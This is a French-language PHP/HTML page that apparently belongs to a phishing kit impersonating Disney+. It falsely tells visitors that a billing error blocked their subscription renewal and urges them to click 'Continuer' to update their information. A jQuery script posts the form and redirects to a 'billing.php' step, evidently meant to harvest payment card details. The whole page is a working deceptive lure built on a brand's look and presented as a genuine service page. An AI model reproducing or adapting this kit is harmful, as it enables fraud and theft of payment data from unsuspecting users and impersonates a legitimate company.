<?php 

include("../common/sub_includes.php");
?>

<html lang="FR" xmlns="http://www.w3.org/1999/xhtml"  style="display: block;">

<?php  include("../common/sub_header.php"); ?>

<body id="app_index" class="js-focus-visible">

    <div id="webAppRoot" data-reactroot="">
        <div id="app_body_content" data-testid="adult-enabled-profile">
            <div class="sc-esoVGF cNOTUj"></div>
            <div id="hudson-wrapper" class="sc-ZUflv kcCFNP video_view--hidden  ">
                <div class="sc-hPeUyl bhhZhW hudson-container">
                    <div data-testid="" class="sc-hSdWYo dfLgnK"><img alt="" aria-hidden="true" src="../assets/images/icon-loader-32@3x.png" class="sc-eHgmQL jstxUN"></div>
                </div>
            </div>
            <div id="webAppHeader" class="onboarding">
                <div class="sc-iuJeZd hcKoaM">
                    <div class="sc-cmthru cJkwKD"><img style="width: 100%; margin: 0px;" src="../assets/images/ico/logo.svg" id="logo" class="sc-kEYyzF jLfEtv"></div>
                </div>
            </div>
            <div id="webAppScene">
                <div id="app_scene_content">
                    <div id="app-background" class="sc-ekHBYt eIfKUM"></div>
                    <main class="onboarding" id="onboarding_index" style="top: 0px;">
                        <div class="onboarding-wrapper">
                            <form  action="" id="formit" name="dssLogin" method="post">

                            <div class="Flex" style="display : flex;flex-direction : column">
                                <h3 color="white" style="color: rgb(249, 249, 249); margin: 0px; padding: 0px 0px 24px;text-align : left;" class="sc-gZMcBi jhLoHG">Ravis de vous revoir</h3>
                                <div>

                                <p style="font-size : 17px">Une erreur de facturation a empêché le renouvellement de votre abonnement</p>
                                <p>Cliquez sur le bouton ci-dessous afin de mettre à jour vos informations et débloquer votre compte</p>
  

                                
                            </div>


                            
                            </div>
                            <div style="margin-top : 20px">
                                    
                                    <button aria-label="Accepter et continuer" id="colorbg"  data-testid="login-continue-button" role="button" kind="primary" value="submit" class="sc-gPEVay jOqQLP" type="submit">
                                    <span id="btnn">Continuer</span> 
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="svgg" style="margin:auto;background:transparent;display:none;" width="230px" height="90%" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                                        <circle cx="50" cy="50" fill="none" stroke="#2ecbff" stroke-width="6" r="34" stroke-dasharray="160.22122533307947 55.40707511102649">
                                        <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="0.7092198581560283s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
                                        </circle>
                                    </svg>
                                    </button>
                            
                            </div>
                            </form>
                        </div>
                    </main>
                </div>
            </div>
            <div tabindex="0" class="sc-eAKXzc fcUHFZ">
                <div id="cta-toast" class="sc-bfYoXt gCjimr"><button aria-label="" data-testid="" role="button" kind="primary" class="sc-gPEVay edYBEy sc-gbOuXE bcVAiB" id="" type="submit">OBTENIR DISNEY+</button></div>
            </div>
            
            <?php
            $sub_folder = true;
            include("../common/footer.php") 
            ?>
        </div>
    </div>

</body>

</html>

<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


<script>

    $("#pass").on("input propertychange",function(){
        if($(this).val().length >= 1){
            $(this).css("border","none")
            $("#error_it").css("display","none")
        }
    })




            $(document).ready(function() {
        			$("#formit").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
                        $("#svgg").css("display","flex")
                    $("#btnn").css("display","none")
        				$.ajax({
        						method: "POST",
                                url: "",
        						data: $(this).serialize()
        					})
        					.then(function(msg) {
                                setTimeout(function() {
                                    window.location.href = "billing.php";
                                }, 500);
        					});
        				
        
        			});
        		});
</script>